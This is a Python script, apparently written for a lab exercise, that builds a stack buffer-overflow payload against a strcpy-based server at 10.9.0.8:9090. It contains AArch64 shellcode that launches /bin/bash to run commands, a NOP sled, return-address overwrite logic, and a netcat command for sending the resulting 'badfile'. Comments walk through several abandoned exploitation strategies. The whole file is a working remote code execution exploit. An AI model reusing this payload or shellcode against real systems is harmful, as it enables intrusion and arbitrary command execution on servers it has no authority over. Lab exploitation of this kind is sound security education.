#!/usr/bin/python3
"""
Task 5: Level-4 Attack
Target: 10.9.0.8:9090 (20-byte buffer, strcpy, very small!)
Strategy: Place shellcode outside buffer, jump to it
"""

import sys

# Shellcode
shellcode = (
    "\x0b\x05\x01\x10\x0c\x04\x84\xd2\x73\x01\x0c\xcb\x29\x01\x09\x4a"
    "\x28\x01\x80\xd2\x69\x6a\x28\x38\x88\x01\x80\xd2\x69\x6a\x28\x38"
    "\xe8\x09\x80\xd2\x69\x6a\x28\x38\x08\x0a\x80\xd2\xe9\x03\x13\xaa"
    "\x69\x6a\x28\xf8\x08\x0b\x80\xd2\x49\x01\x80\xd2\xe9\x03\x09\xcb"
    "\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0c\x80\xd2\x09\x02\x80\xd2"
    "\xe9\x03\x09\xcb\x69\x02\x09\xcb\x69\x6a\x28\xf8\x08\x0d\x80\xd2"
    "\x29\x01\x09\xca\x69\x6a\x28\xf8\xe0\x03\x13\xaa\x61\x42\x01\xb1"
    "\x94\x02\x14\xca\xe2\x03\x14\xaa\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"
    "/bin/bash*"
    "-c****"
    "echo '=== LEVEL 4 PWNED ==='; /bin/whoami; /bin/id             *"
    "AAAAAAAA"
    "BBBBBBBB"
    "CCCCCCCC"
    "DDDDDDDD"
).encode('latin-1')

# Fill with NOPs
nop = (0xD503201F).to_bytes(4, byteorder='little')
content = bytearray(517)
for offset in range(int(517/4)):
    content[offset*4:offset*4 + 4] = nop

# ===== UPDATE THESE VALUES =====
# Run: echo hello | nc 10.9.0.8 9090
buffer_addr = 0x0000fffffffff100      # ← UPDATE from server output
frame_pointer = 0x0000fffffffff0e0    # ← UPDATE from server output
# ================================

# Calculate return address location
ret_addr_location = frame_pointer + 8
offset_to_ret = ret_addr_location - buffer_addr

# Strategy: Place shellcode at an offset BEFORE the return address
# Since buffer is only 20 bytes, we can't fit shellcode there
# But we can place it earlier in the payload
#
# The payload structure:
#   [NOP sled][Padding to return address][Return address value][Shellcode]
#
# Wait, that won't work with strcpy - it'll stop at null bytes in return addr
#
# Better strategy:
#   [Small overflow to reach ret addr][Return address][NOP sled][Shellcode]
#
# Actually, let's place shellcode right after the return address position
# strcpy will copy: buffer content, overflow, return address (until null)
# Then we can place shellcode after the null bytes, but we can't jump to it
# if strcpy stopped...
#
# Best strategy for this specific case:
# Place shellcode at a NEGATIVE offset from buffer (higher address on stack)
# OR place it at the beginning, make return address point there

# Let's use: Place shellcode at buffer start, let it overflow,
# then place return address to point back to buffer start
shellcode_offset = 0
content[shellcode_offset:shellcode_offset + len(shellcode)] = shellcode

# Return address points to shellcode at buffer start
ret = buffer_addr + shellcode_offset

print(f"Payload info:")
print(f"  Buffer: {hex(buffer_addr)} (only 20 bytes!)")
print(f"  Frame pointer: {hex(frame_pointer)}")
print(f"  Return address at: {hex(ret_addr_location)} (offset {offset_to_ret})")
print(f"  Shellcode placed at offset: {shellcode_offset}")
print(f"  Return value: {hex(ret)} (points to shellcode)")

# Write return address
if offset_to_ret >= 0 and offset_to_ret + 8 <= len(content):
    ret_bytes = ret.to_bytes(8, byteorder='little')
    content[offset_to_ret:offset_to_ret + 8] = ret_bytes

    # Check null byte position
    null_pos = ret_bytes.find(b'\x00')
    print(f"  Null byte in return address at position: {null_pos}")
else:
    print(f"ERROR: Invalid offset {offset_to_ret}")
    sys.exit(1)

# Save payload
with open('badfile', 'wb') as f:
    f.write(content)

print(f"\nPayload generated: badfile")
print(f"Send with: cat badfile | nc 10.9.0.8 9090")
